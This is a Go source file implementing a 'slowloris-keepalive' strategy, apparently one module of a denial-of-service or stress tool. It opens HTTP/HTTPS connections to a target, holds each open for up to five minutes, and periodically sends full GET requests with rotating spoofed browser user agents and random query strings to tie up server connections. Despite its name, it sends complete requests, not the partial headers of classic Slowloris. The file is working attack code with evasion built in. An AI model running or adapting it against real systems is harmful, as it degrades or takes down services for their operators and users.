package strategy

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"strings"
	"sync/atomic"
	"time"
)

type Slowloris struct {
	keepAliveInterval time.Duration
	connectionTimeout time.Duration
	maxSessionLife    time.Duration
	userAgents        []string
	activeConnections int64
	localAddr         *net.TCPAddr
}

var defaultUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func NewSlowloris(keepAliveInterval time.Duration, bindIP string) *Slowloris {
	return &Slowloris{
		keepAliveInterval: keepAliveInterval,
		connectionTimeout: 10 * time.Second,
		maxSessionLife:    5 * time.Minute,
		userAgents:        defaultUserAgents,
		localAddr:         newLocalTCPAddr(bindIP),
	}
}

func (s *Slowloris) Execute(ctx context.Context, target Target) error {
	parsedURL, host, useTLS, err := parseTargetURL(target.URL)
	if err != nil {
		return err
	}

	sessionCtx, cancel := context.WithTimeout(ctx, s.maxSessionLife)
	defer cancel()

	var conn net.Conn
	dialer := &net.Dialer{
		Timeout:   s.connectionTimeout,
		LocalAddr: s.localAddr,
	}

	if useTLS {
		tlsConfig := &tls.Config{
			ServerName:         parsedURL.Hostname(),
			InsecureSkipVerify: false,
		}
		conn, err = tls.DialWithDialer(dialer, "tcp", host, tlsConfig)
	} else {
		conn, err = dialer.DialContext(sessionCtx, "tcp", host)
	}

	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close()
	atomic.AddInt64(&s.activeConnections, 1)
	defer atomic.AddInt64(&s.activeConnections, -1)

	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	if err := s.sendCompleteRequest(conn, parsedURL.Host, path); err != nil {
		return err
	}

	if err := s.drainResponse(conn); err != nil {
		return err
	}

	ticker := time.NewTicker(s.keepAliveInterval)
	defer ticker.Stop()

	for {
		select {
		case <-sessionCtx.Done():
			return nil
		case <-ticker.C:
			if err := s.sendCompleteRequest(conn, parsedURL.Host, path); err != nil {
				return fmt.Errorf("keep-alive request failed: %w", err)
			}

			if err := s.drainResponse(conn); err != nil {
				return fmt.Errorf("keep-alive response failed: %w", err)
			}
		}
	}
}

func (s *Slowloris) sendCompleteRequest(conn net.Conn, host string, path string) error {
	userAgent := s.userAgents[rand.Intn(len(s.userAgents))]
	queryParam := rand.Intn(100000)

	request := fmt.Sprintf(
		"GET %s?r=%d HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
			"Accept-Language: en-US,en;q=0.5\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n",
		path,
		queryParam,
		host,
		userAgent,
	)

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(request)); err != nil {
		return fmt.Errorf("failed to write request: %w", err)
	}

	return nil
}

func (s *Slowloris) drainResponse(conn net.Conn) error {
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	reader := bufio.NewReader(conn)

	statusLine, err := reader.ReadString('\n')
	if err != nil {
		return fmt.Errorf("failed to read status line: %w", err)
	}

	if !strings.HasPrefix(statusLine, "HTTP/") {
		return fmt.Errorf("invalid HTTP response: %s", statusLine)
	}

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			return fmt.Errorf("failed to read header: %w", err)
		}

		if line == "\r\n" || line == "\n" {
			break
		}
	}

	return nil
}

func (s *Slowloris) Name() string {
	return "slowloris-keepalive"
}

func (s *Slowloris) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}

func parseTargetURL(targetURL string) (*url.URL, string, bool, error) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil, "", false, fmt.Errorf("invalid URL: %w", err)
	}

	scheme := strings.ToLower(parsed.Scheme)
	if scheme != "http" && scheme != "https" {
		if scheme == "" {
			return nil, "", false, fmt.Errorf("missing scheme: URL must start with http:// or https:// (got: %s)", targetURL)
		}
		return nil, "", false, fmt.Errorf("unsupported scheme: %s (only http/https allowed)", scheme)
	}

	host := parsed.Host
	if host == "" {
		return nil, "", false, fmt.Errorf("missing host in URL")
	}

	useTLS := scheme == "https"

	if !strings.Contains(host, ":") {
		if useTLS {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	return parsed, host, useTLS, nil
}
